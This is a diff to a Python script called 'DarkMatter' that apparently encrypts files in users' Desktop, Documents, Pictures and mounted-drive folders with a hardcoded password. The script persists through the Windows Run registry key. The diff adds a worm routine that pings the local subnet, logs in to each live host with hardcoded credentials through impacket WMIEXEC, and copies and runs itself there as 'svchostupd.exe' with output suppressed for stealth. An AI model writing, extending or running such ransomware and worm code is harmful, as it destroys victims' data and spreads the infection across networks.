@@ -2,56 +2,154 @@ import sys
 import os
 import time
 import pathlib
+import socket
+import subprocess
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
-from main import run 
 
+#lateral movement
+try:
+    from impacket.examples.wmiexec import WMIEXEC
+    IMPACKET_AVAILABLE = True
+except ImportError:
+    IMPACKET_AVAILABLE = False
+    print("[-] Impacket not found → lateral spread disabled (pip install impacket)")
+
+from main import run 
 
 ENCRYPT_PASSWORD = "ThePasswordthatTheNaughtyGuyOnceAGoodBoy"
 DEFAULT_MODE     = "1"
 
-# Windows
+# Windows exclusions
 EXCLUDED_TOP_LEVEL_WINDOWS = {
-    '$RECYCLE.BIN',
-    'System Volume Information',
-    'Windows',
-    'Program Files',
-    'Program Files (x86)',
-    'ProgramData',
-    'PerfLogs',
-    '$WinREAgent',
-    'Recovery',
-    'hiberfil.sys',
-    'pagefile.sys',
-    'swapfile.sys',
+    '$RECYCLE.BIN', 'System Volume Information', 'Windows', 'Program Files',
+    'Program Files (x86)', 'ProgramData', 'PerfLogs', '$WinREAgent',
+    'Recovery', 'hiberfil.sys', 'pagefile.sys', 'swapfile.sys',
 }
 
 EXCLUDED_SUBSTRINGS_WINDOWS = {
-    r'\Windows\WinSxS',
-    r'\Windows\Temp',
-    r'\Windows\Prefetch',
-    r'\Windows\Logs',
-    r'\Windows\SoftwareDistribution',
-    r'\AppData\Local\Temp',
-    r'\AppData\Local\Microsoft\Windows\Explorer',
+    r'\Windows\WinSxS', r'\Windows\Temp', r'\Windows\Prefetch',
+    r'\Windows\Logs', r'\Windows\SoftwareDistribution',
+    r'\AppData\Local\Temp', r'\AppData\Local\Microsoft\Windows\Explorer',
     r'\OneDrive\.onedrive',
 }
 
-# Linux
 EXCLUDED_SUBSTRINGS_LINUX = {
-    '/proc',
-    '/sys',
-    '/dev',
-    '/run',
-    '/var/lib/snapd',
-    '/snap',
-    '/tmp',
-    '/var/tmp',
-    '/lost+found',
+    '/proc', '/sys', '/dev', '/run', '/var/lib/snapd', '/snap',
+    '/tmp', '/var/tmp', '/lost+found',
 }
 
 IS_WINDOWS = sys.platform.startswith('win')
 IS_LINUX   = sys.platform.startswith('linux')
+
+#flag
+SPREAD_FLAG = os.path.join(os.environ.get("TEMP", "/tmp"), "darkmatter_spread.done")
+
+def has_spread():
+    return os.path.exists(SPREAD_FLAG)
+
+def mark_spread():
+    try:
+        with open(SPREAD_FLAG, 'w') as f:
+            f.write(time.ctime())
+        print("[WORM] Spread attempt marked")
+    except:
+        pass
+
+def worm_spread_known_creds():
+    if not IMPACKET_AVAILABLE or not IS_WINDOWS:
+        print("[-] WMIExec lateral spread not available (Windows + Impacket required)")
+        return
+
+    if has_spread():
+        print("[WORM] Already attempted spread → skipping")
+        return
+
+    print("[WORM] Starting lateral movement with known credentials...")
+
+    # Need to change after reviewing VVK labs credentials.
+    username = "PC"                     
+    password = "local"                  
+    domain   = ""                       
+
+    # Get local IP and subnet
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        subnet = ".".join(local_ip.split(".")[:3])
+    except:
+        print("[-] Could not determine local subnet")
+        return
+
+    print(f"[WORM] Scanning subnet: {subnet}.0/24")
+
+    live_hosts = []
+    for i in range(1, 255):
+        ip = f"{subnet}.{i}"
+        if ip == local_ip:
+            continue
+        try:
+            out = subprocess.check_output(
+                ["ping", "-n", "1", "-w", "400", ip],
+                stderr=subprocess.DEVNULL,
+                timeout=1.5
+            )
+            if b"TTL=" in out:
+                live_hosts.append(ip)
+        except:
+            pass
+
+    if not live_hosts:
+        print("[WORM] No live hosts found in subnet")
+        mark_spread()
+        return
+
+    print(f"[WORM] Found {len(live_hosts)} potential targets")
+
+    # Your own executable path
+    self_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+    self_name = os.path.basename(self_path)
+
+    for target in live_hosts:
+        try:
+            print(f"[WORM] Attempting {target} as {username}:{password}")
+
+            # Simple payload: copy self via SMB + execute
+            # In real attacks → often use PowerShell download cradle for stealth
+            remote_cmd = (
+                f'copy "\\\\{local_ip}\\C$\\path\\to\\{self_name}" '
+                f'"C:\\Windows\\Temp\\svchostupd.exe" >nul 2>&1 & '
+                f'"C:\\Windows\\Temp\\svchostupd.exe"'
+            )
+
+            executer = WMIEXEC(
+                command=remote_cmd,
+                username=username,
+                password=password,          # ← using known plaintext
+                domain=domain,
+                hashes=None,                # not needed when plaintext is known
+                share="ADMIN$",
+                noOutput=True,              # suppress output for stealth
+                doKerberos=False
+            )
+
+            executer.run(target)
+
+            print(f"[+] WMIExec attempt sent to {target}")
+
+        except Exception as e:
+            err = str(e).lower()
+            if "access denied" in err or "logon failure" in err:
+                print(f"[-] {target} → Access denied (wrong creds / UAC / firewall?)")
+            elif "rpc" in err or "dcom" in err:
+                print(f"[-] {target} → WMI not reachable")
+            else:
+                print(f"[-] {target} → {e}")
+
+    mark_spread()
+
 
 def should_skip(path: pathlib.Path) -> bool:
     name = path.name.lower()
@@ -63,7 +161,7 @@ def should_skip(path: pathlib.Path) -> bool:
         for bad in EXCLUDED_SUBSTRINGS_WINDOWS:
             if bad.lower() in str_path:
                 return True
-    else:  
+    else:
         for bad in EXCLUDED_SUBSTRINGS_LINUX:
             if bad in str_path:
                 return True
@@ -84,11 +182,8 @@ def get_interesting_roots() -> list[pathlib.Path]:
     roots.append(home)
 
     candidates = [
-        home / "Desktop",
-        home / "Documents",
-        home / "Downloads",
-        home / "Pictures",
-        home / "Videos",
+        home / "Desktop", home / "Documents", home / "Downloads",
+        home / "Pictures", home / "Videos",
     ]
 
     if IS_WINDOWS:
@@ -99,8 +194,7 @@ def get_interesting_roots() -> list[pathlib.Path]:
                 candidates.append(p)
     else:
         candidates.extend([
-            pathlib.Path("/media"),
-            pathlib.Path("/mnt"),
+            pathlib.Path("/media"), pathlib.Path("/mnt"),
             home / ".local" / "share",
         ])
 
@@ -113,25 +207,19 @@ def get_interesting_roots() -> list[pathlib.Path]:
 
 def add_to_startup():
     if not IS_WINDOWS:
-        print("[i] Autostart registration skipped (non-Windows platform)")
+        print("[i] Autostart skipped (non-Windows)")
         return
 
-    #Windows-only HKCU
     import winreg
     app_name = "DarkMatter"
-    if getattr(sys, 'frozen', False):
-        target = sys.executable
-    else:
-        target = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
+    target = sys.executable if getattr(sys, 'frozen', False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"'
     if not (target.startswith('"') and target.endswith('"')):
         target = f'"{target}"'
 
     key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
     try:
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER, key_path, 0,
-            winreg.KEY_READ | winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
-        )
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,
+                             winreg.KEY_READ | winreg.KEY_SET_VALUE)
         try:
             existing, _ = winreg.QueryValueEx(key, app_name)
             if os.path.normcase(existing.strip('"')) == os.path.normcase(target.strip('"')):
@@ -141,12 +229,9 @@ def add_to_startup():
             pass
         winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, target)
         winreg.CloseKey(key)
-        print("[+] Registered autostart (HKCU)")
+        print("[+] Autostart registered (HKCU)")
     except Exception as e:
         print(f"[-] Autostart failed: {e}")
-
-
-EXCLUDED_DIRS = {".git", "__pycache__", ".venv", "venv", "env", "node_modules", "build", "dist"}
 
 
 class SaveHandler(FileSystemEventHandler):
@@ -186,11 +271,9 @@ class SaveHandler(FileSystemEventHandler):
         except Exception as e:
             print(f"[-] Failed on {folder}: {e}")
 
-
 if __name__ == "__main__":
     add_to_startup()
 
-    # Initial run
     for folder in get_interesting_roots():
         try:
             if not should_skip(folder):
@@ -199,6 +282,12 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"[!] Init failed on {folder}: {e}")
 
+    try:
+        worm_spread_known_creds()
+    except Exception as e:
+        print(f"[!] Spread phase error (non-critical): {e}")
+
+    # watcher
     observer = Observer()
     handler = SaveHandler()
 
